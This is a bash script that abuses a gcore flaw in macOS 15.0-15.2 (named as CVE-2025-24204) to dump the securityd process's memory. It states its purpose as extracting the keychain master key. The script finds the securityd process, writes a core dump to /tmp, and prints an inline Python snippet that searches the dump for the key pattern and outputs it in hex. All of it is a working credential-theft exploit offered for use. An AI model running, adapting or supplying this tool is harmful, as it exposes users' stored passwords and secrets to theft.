#!/bin/bash
#
# Dump securityd process memory for keychain master key extraction
# Requires: macOS 15.0-15.2 (Sequoia) with CVE-2025-24204 vulnerability
# Usage: sudo ./dump_securityd_memory.sh [--output <path>]
#

set -e

OUTPUT_DIR="/tmp/securityd_dump"
OUTPUT_FILE=""

# Parse arguments
while [[ $# -gt 0 ]]; do
    case $1 in
        --output)
            OUTPUT_DIR="$2"
            shift 2
            ;;
        *)
            echo "Unknown option: $1"
            echo "Usage: sudo ./dump_securityd_memory.sh [--output <path>]"
            exit 1
            ;;
    esac
done

# Create output directory
mkdir -p "$OUTPUT_DIR"

# Find securityd PID
SECURITYD_PID=$(pgrep securityd)

if [ -z "$SECURITYD_PID" ]; then
    echo "Error: securityd process not found" >&2
    exit 1
fi

echo "Found securityd PID: $SECURITYD_PID"
echo "Output directory: $OUTPUT_DIR"
echo ""

# Check if gcore is available
if ! command -v gcore &> /dev/null; then
    echo "Error: gcore not found. This script requires macOS 15.0-15.2 with the vulnerable gcore binary." >&2
    exit 1
fi

# Dump memory
echo "Dumping securityd memory..."
OUTPUT_FILE="$OUTPUT_DIR/securityd.$SECURITYD_PID"

sudo gcore -o "$OUTPUT_FILE" "$SECURITYD_PID"

if [ $? -eq 0 ]; then
    echo ""
    echo "Memory dump saved to: $OUTPUT_FILE"
    echo ""
    echo "To extract the master key, run:"
    echo "  python3 extract_keychain_master_key.py $OUTPUT_FILE"
    echo ""
    echo "Or use the inline Python command:"
    echo "  python3 - <<'PY'"
    echo "import mmap,re,sys"
    echo "with open('$OUTPUT_FILE','rb') as f:"
    echo "    mm=mmap.mmap(f.fileno(),0,access=mmap.ACCESS_READ)"
    echo "    for m in re.finditer(b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x18.{96}',mm):"
    echo "        c=m.group(0)"
    echo "        if b'SALTED-SHA512-PBKDF2' in c: print(c.hex()); break"
    echo "PY"
else
    echo "Error: Failed to dump securityd memory" >&2
    exit 1
fi
